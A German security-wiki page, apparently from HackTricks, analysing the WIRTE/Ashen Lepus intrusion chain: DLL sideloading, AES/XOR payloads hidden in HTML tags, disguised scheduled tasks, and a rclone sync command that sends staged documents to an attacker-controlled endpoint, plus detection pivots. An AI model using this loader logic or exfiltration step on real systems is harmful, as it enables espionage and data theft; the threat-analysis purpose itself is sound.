# Advancedes DLL-Sideloading mit HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Überblick über die Tradecraft

Ashen Lepus (auch bekannt als WIRTE) weaponized ein wiederverwendbares Muster, das DLL-Sideloading, gestagte HTML-Payloads und modulare .NET-Backdoors miteinander verbindet, um sich in diplomatischen Netzwerken des Nahen Ostens zu persistieren. Die Technik kann von jedem Operator wiederverwendet werden, da sie auf Folgendem basiert:<sup>[[1]](#references)</sup>

- **Archivbasiertes Social Engineering**: Harmlose PDFs weisen die Ziele an, ein RAR-Archiv von einer File-Sharing-Site herunterzuladen. Das Archiv enthält ein echt aussehendes Document-Viewer-EXE, eine bösartige DLL mit dem Namen einer vertrauenswürdigen Bibliothek (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) und ein gefälschtes `Document.pdf`.
- **Missbrauch der DLL-Suchreihenfolge**: Das Opfer doppelklickt auf das EXE, Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) wird innerhalb des vertrauenswürdigen Prozesses ausgeführt, während das gefälschte PDF geöffnet wird, um keinen Verdacht zu erregen.
- **Living-off-the-land-Staging**: Jede nachfolgende Stage (AshenStager → AshenOrchestrator → Module) bleibt bis zum benötigten Zeitpunkt vom Datenträger fern und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Responses versteckt sind.

## Multi-Stage-Sideloading-Kette

1. **Decoy EXE → AshenLoader**: Das EXE lädt AshenLoader per Side-Loading, führt Host-Recon durch, verschlüsselt es mit AES-CTR und sendet es in wechselnden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade (z. B. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML-Extraktion**: Das C2 gibt die nächste Stage nur preis, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` dem Implant entspricht, wodurch Sandboxes behindert werden. Wenn die Prüfungen erfolgreich sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit der Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Zweites Sideloading**: AshenStager wird zusammen mit einer weiteren legitimen Binary eingesetzt, die `wtsapi32.dll` importiert. Die in die Binary injizierte bösartige Kopie ruft weiteres HTML ab und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: Ein modularer .NET-Controller, der eine Base64-JSON-Konfiguration decodiert. Die Felder `tg` und `au` der Konfiguration werden verkettet/gehasht und bilden den AES-Schlüssel, der `xrk` entschlüsselt. Die resultierenden Bytes dienen als XOR-Schlüssel für jeden danach abgerufenen Modul-Blob.
5. **Modulbereitstellung**: Jedes Modul wird über HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und dadurch statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Zu den Modulen gehören Persistence (`PR*`), Uninstaller (`UN*`), Reconnaissance (`SN`), Screen Capture (`SCT`) und File Exploration (`FE`).

### HTML-Container-Parsing-Muster
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator lediglich das im HTML-Kommentar angedeutete Tag ändern, um die Auslieferung fortzusetzen.<sup>[[1]](#references)</sup>

### Schneller Extraktionshelfer (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallelen zur HTML-Staging-Evasion

Aktuelle Forschung zu HTML smuggling (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen verborgen und zur Laufzeit per JavaScript decodiert werden.<sup>[[2]](#references)</sup> Derselbe Trick kann für C2-Antworten wiederverwendet werden: Verschlüsselte Blobs innerhalb eines Script-Tags (oder eines anderen DOM-Elements) platzieren und sie vor AES/XOR im Speicher decodieren, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt außerdem mehrschichtige Obfuscation (Umbenennung von Identifiern plus Base64/Caesar/AES) innerhalb von Script-Tags, was sich problemlos auf HTML-gestagte C2-Blobs übertragen lässt.<sup>[[2]](#references)</sup> Ein späterer Talos-Bericht über **hidden text salting** ist ebenfalls relevant: Das Aufteilen von Base64 durch irrelevante HTML-Kommentare oder Whitespace reicht aus, um einfache Regex-Extractor zu umgehen, während die browserseitige Rekonstruktion trivial bleibt.<sup>[[7]](#references)</sup>

## Hinweise zu aktuellen Varianten (2024-2025)

- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archive-basiertes Sideloading setzten, jedoch `propsys.dll` (stagerx64) als erste Stage verwendeten. Der Stager decodiert die nächste Payload mit Base64 + XOR (Key `53`), sendet HTTP-Requests mit einem hardcodierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Zweig wurde die Stage aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die mit `RtlIpv4StringToAddressA` decodiert und anschließend zu den Payload-Bytes verkettet wurden.<sup>[[3]](#references)</sup>
- OWN-CERT dokumentierte frühere WIRTE-Tools, bei denen der side-geladene `wtsapi32.dll`-Dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Decryption-Key verwendete. Anschließend wurden Host-Identifikationsdaten per XOR/Base64 obfuskiert, bevor sie an das C2 gesendet wurden.<sup>[[4]](#references)</sup>

## Rekonstruktion IP-kodierter Stages

Der `propsys.dll`-Zweig von WIRTE aus dem Jahr 2024 zeigt, dass die nächste PE nicht als ein zusammenhängender HTML-Blob vorliegen muss. Der Loader kann Stage-Bytes als Dotted-Quad-Strings ablegen und sie mit `RtlIpv4StringToAddressA` wiederherstellen – ein Muster, das eng mit Hives **IPfuscation**-Tradecraft verwandt ist.<sup>[[3]](#references)[[5]](#references)</sup> Operativ ist dies nützlich, wenn der Akteur möchte, dass die HTML-Seite scheinbar harmlose IOCs oder Config-Daten enthält, anstatt einer offensichtlich erkennbaren Base64-Payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Wenn die wiederhergestellten Bytes mit `MZ` beginnen, haben Sie wahrscheinlich direkt das nächste PE rekonstruiert. Falls nicht, prüfen Sie auf eine vorangestellte XOR/Base64-Schicht oder kleine Trennzeichen-Blöcke zwischen den Adressen.

## Austauschbare DLL-Namen & Host-Rotation

Eine wichtige Eigenschaft dieses Musters ist, dass das **HTML/AES/XOR-staging backend identisch bleiben kann, während sich nur das Sideload-Paar ändert**. WIRTE wechselte in verschiedenen Kampagnen zwischen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` und `propsys.dll`, was nützlich ist, weil:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` und `wtsapi32.dll` sind unauffällige Windows-DLL-Namen, deren Existenz Defender in `%System32%` / `%SysWOW64%` erwarten.
- Öffentliche Kataloge wie **HijackLibs** ordnen bereits viele Binaries zu, die diese DLL-Namen aus einem kopierten Anwendungsverzeichnis laden, und bieten Operatoren dadurch Ersatz-Hosts, ohne dass der Stager neu entwickelt werden muss.
- Nur die Export-Oberfläche muss je nach Host angepasst werden. Der HTML-Parser, die AES/XOR-Routinen und der Module Loader können normalerweise unverändert in eine Forwarding-Proxy-DLL übernommen werden.

Für offensive Laborarbeit bedeutet dies, dass Sie das Problem in **(1) einen stabilen signierten Host finden, der den gewünschten DLL-Namen lokal auflöst, und (2) dieselbe staged-HTML-Loader-Logik hinter dieser DLL wiederverwenden** aufteilen können.

## Crypto & C2-Härtung

- **AES-CTR überall**: Aktuelle Loader enthalten 256-Bit-Schlüssel sowie Nonces (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht mit Strings wie `msasn1.dll` vor oder nach der Entschlüsselung hinzu.<sup>[[1]](#references)</sup>
- **Variationen des Schlüsselmaterials**: Frühere Loader verwendeten Base64 + TEA zum Schutz eingebetteter Strings, wobei der Entschlüsselungsschlüssel aus dem Namen der schädlichen DLL abgeleitet wurde (z. B. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Infrastructure-Split + Subdomain-Camouflage**: Staging-Server werden pro Tool getrennt, über verschiedene ASNs gehostet und teilweise durch legitim wirkende Subdomains vorgeschaltet, sodass das Aufdecken einer Stage nicht den Rest preisgibt.
- **Recon-Smuggling**: Die aufgezählten Daten enthalten nun auch Auflistungen von Program Files, um hochwertige Anwendungen zu identifizieren, und werden stets verschlüsselt, bevor sie den Host verlassen.
- **URI-Churn**: Query-Parameter und REST-Pfade wechseln zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch spröde Erkennungsregeln unwirksam werden.
- **User-Agent-Pinning + sichere Redirects**: Die C2-Infrastruktur antwortet nur auf exakt passende UA-Strings und leitet ansonsten auf harmlose Nachrichten-/Gesundheitsseiten weiter, um sich in normalen Traffic einzufügen.
- **Gated Delivery**: Server sind geografisch eingeschränkt und antworten nur echten Implants. Nicht freigegebene Clients erhalten unscheinbares HTML.

## Persistence & Execution Loop

AshenStager legt Scheduled Tasks an, die sich als Windows-Wartungsaufgaben tarnen und über `svchost.exe` ausgeführt werden, z. B.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die Sideloading-Kette beim Booten oder in Intervallen erneut und stellen sicher, dass AshenOrchestrator neue Module anfordern kann, ohne erneut auf die Festplatte zu schreiben.

## Verwendung harmloser Sync-Clients für Exfiltration

Operatoren legen diplomatische Dokumente über ein dediziertes Modul in `C:\Users\Public` ab (für alle Benutzer lesbar und unverdächtig) und laden anschließend das legitime Binary [Rclone](https://rclone.org/) herunter, um dieses Verzeichnis mit dem Speicher des Angreifers zu synchronisieren. Laut Unit42 ist dies das erste Mal, dass dieser Akteur bei der Exfiltration mit Rclone beobachtet wurde. Dies entspricht dem breiteren Trend, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:<sup>[[1]](#references)</sup>

1. **Stage**: Zieldateien nach `C:\Users\Public\{campaign}\` kopieren/sammeln.
2. **Configure**: Eine Rclone-Konfiguration bereitstellen, die auf einen vom Angreifer kontrollierten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, damit der Traffic wie normale Cloud-Backups aussieht.

Da Rclone häufig für legitime Backup-Workflows verwendet wird, müssen Defender den Schwerpunkt auf anomale Ausführungen legen (neue Binaries, ungewöhnliche Remotes oder eine plötzliche Synchronisierung von `C:\Users\Public`).

## Detection Pivots

- **Signierte Prozesse** melden, die unerwartet DLLs aus benutzerschreibbaren Pfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), insbesondere wenn die DLL-Namen `netutils`, `srvcli`, `dwampi`, `wtsapi32` oder `propsys` enthalten.<sup>[[6]](#references)</sup>
- Verdächtige HTTPS-Antworten auf **große Base64-Blobs in ungewöhnlichen Tags** oder auf durch `<!-- TAG: <xyz> -->`-Kommentare geschützte Inhalte untersuchen.
- HTML zuerst normalisieren: **Kommentare entfernen und Whitespace vor der Base64-Extraktion zusammenfassen**, da Evasion im Stil von Hidden-Text-Salting Payloads über Kommentargrenzen hinweg aufteilen kann.
- Die HTML-Suche auf **Base64-Strings innerhalb von `<script>`-Blöcken** ausweiten (HTML-smuggling-artiges Staging), die vor der AES/XOR-Verarbeitung durch JavaScript decodiert werden.
- Nach wiederholten Aufrufen von **`RtlIpv4StringToAddressA` gefolgt von Buffer-Assembly** suchen, insbesondere wenn die umgebenden Strings lange IPv4-Listen statt echter Netzwerkziele sind.
- Nach **Scheduled Tasks** suchen, die `svchost.exe` mit Nicht-Service-Argumenten ausführen oder auf Dropper-Verzeichnisse verweisen.
- **C2-Redirects** nachverfolgen, die Payloads nur für exakt passende `User-Agent`-Strings zurückgeben und ansonsten auf legitime Nachrichten-/Gesundheitsdomains weiterleiten.
- Auf **Rclone**-Binaries außerhalb von durch die IT verwalteten Speicherorten, neue `rclone.conf`-Dateien oder Sync-Jobs achten, die aus Staging-Verzeichnissen wie `C:\Users\Public` lesen.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
